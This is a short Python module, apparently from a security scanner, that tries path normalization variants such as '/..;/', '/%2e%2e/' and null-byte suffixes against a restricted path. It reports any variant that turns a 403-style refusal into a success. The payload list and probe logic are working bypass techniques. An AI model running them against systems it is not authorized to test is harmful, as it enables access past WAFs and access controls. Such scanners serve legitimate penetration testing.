"""F10 — Path Normalization Bypass 矩阵。

WAF/URL 过滤绕过：/.// /../ /%2e%2e/ 等变体。
"""
from __future__ import annotations

from typing import Any

NORMALIZATION_VARIANTS = [
    "/.//<path>",
    "/../<path>",
    "/<path>/../",
    "/%2e%2e/<path>",
    "//<path>",
    "/<path>;/",
    "/%2e%2e///..///",
    "/<path>/..;/",
    "/<path>%00",
    "/<path>%20",
]


def scan_path_variants(
    base_url: str,
    base_path: str,
    original_status: int,
    request_fn: Any | None = None,
) -> list[dict[str, Any]]:
    """对给定路径测试所有规范化变体，返回绕过列表。

    Args:
        base_url: 目标根 URL
        base_path: 原始受限路径（如 /admin/user）
        original_status: 原始请求状态码（如 403）
        request_fn: 可选请求回调
    """
    bypasses: list[dict[str, Any]] = []
    clean_path = base_path.strip("/")

    for variant in NORMALIZATION_VARIANTS:
        url_path = variant.replace("<path>", clean_path)
        full_url = base_url.rstrip("/") + url_path

        entry: dict[str, Any] = {"variant": variant, "url": full_url}

        if request_fn:
            try:
                resp = request_fn("GET", full_url)
                status = getattr(resp, "status", 200)
            except Exception as exc:
                status = -1
                entry["error"] = str(exc)
        else:
            status = -1

        entry["status"] = status
        entry["cwe"] = "CWE-22" if ".." in variant else "CWE-601"

        if status < 0:
            entry["bypass"] = False
        elif status == original_status and original_status >= 400:
            entry["bypass"] = False
        elif status != original_status and status < 400 and original_status >= 400:
            entry["bypass"] = True
            bypasses.append(entry)
        else:
            entry["bypass"] = False

    return bypasses


# 兼容别名
test_path_variants = scan_path_variants

__all__ = ["scan_path_variants", "test_path_variants", "NORMALIZATION_VARIANTS"]
